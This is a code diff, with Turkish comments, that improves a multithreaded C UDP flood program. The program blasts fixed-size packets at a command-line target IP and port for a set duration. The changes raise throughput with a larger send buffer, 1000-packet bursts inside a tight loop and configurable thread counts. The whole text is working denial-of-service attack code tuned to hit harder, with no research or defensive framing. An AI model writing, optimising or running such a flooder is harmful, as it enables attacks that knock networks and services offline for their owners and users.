@@ -10,13 +10,18 @@ char *target_ip;
 int target_port, packet_size, thread_count, duration;
 
 void *flood(void *arg) {
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) {
         perror("socket");
         pthread_exit(NULL);
     }
 
+    // socket send buffer büyütülsün (opsiyonel ama faydalı)
+    int buffsize = 1024 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffsize, sizeof(buffsize));
+
     struct sockaddr_in target;
+    memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_port = htons(target_port);
     target.sin_addr.s_addr = inet_addr(target_ip);
@@ -24,9 +29,14 @@ void *flood(void *arg) {
     char *data = malloc(packet_size);
     memset(data, 'A', packet_size);
 
+    // tekrar hesaplamasın diye süreyi bir defa al
     time_t end = time(NULL) + duration;
+
+    // optimize edilmiş tight loop (çok hızlı çalışır)
     while (time(NULL) < end) {
-        sendto(sock, data, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
+        for (int i = 0; i < 1000; i++) {  // 1000 adet burst
+            sendto(sock, data, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
+        }
     }
 
     free(data);
@@ -46,7 +56,8 @@ int main(int argc, char *argv[]) {
     thread_count = atoi(argv[4]);
     duration = atoi(argv[5]);
 
-    pthread_t threads[thread_count];
+    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
+
     for (int i = 0; i < thread_count; i++) {
         pthread_create(&threads[i], NULL, flood, NULL);
     }
@@ -55,6 +66,7 @@ int main(int argc, char *argv[]) {
         pthread_join(threads[i], NULL);
     }
 
+    free(threads);
     printf("Flood işlemi tamamlandı.\n");
     return 0;
 }
